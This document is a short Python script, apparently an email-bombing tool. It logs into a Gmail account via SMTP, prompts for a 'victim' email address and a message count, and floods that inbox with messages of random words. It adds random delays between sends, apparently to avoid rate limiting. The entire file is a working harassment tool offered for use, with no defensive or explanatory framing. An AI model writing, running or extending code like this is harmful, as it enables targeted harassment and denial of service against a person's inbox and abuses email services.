import smtplib
import time
import random
import os
import colorama
from colorama import Fore, Back, Style
from random_word import RandomWords

colorama.init()
print(Fore.LIGHTCYAN_EX + "")

user = "EMAIL HERE"
passwd = "PASSWORD HERE"
victim = input("please input victim email here\n")

def mail_sender():
    r = RandomWords()
    w = r.get_random_word()
    x = r.get_random_word()
    y = r.get_random_word()
    z = r.get_random_word()
    subject = w
    msg = x + " " + y + " " + z
    message = "Subject:" + subject + "\n" + msg
    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    server.login(user , passwd)
    server.sendmail(
        user,
        victim,
        message)
    server.quit()

def spam():
    spam_count = int(input("how many emails to send?"))
    for i in range(spam_count):
            mail_sender()
            print("message sent!")
            zzz = random.randint(1,9)
            time.sleep(zzz)

spam()
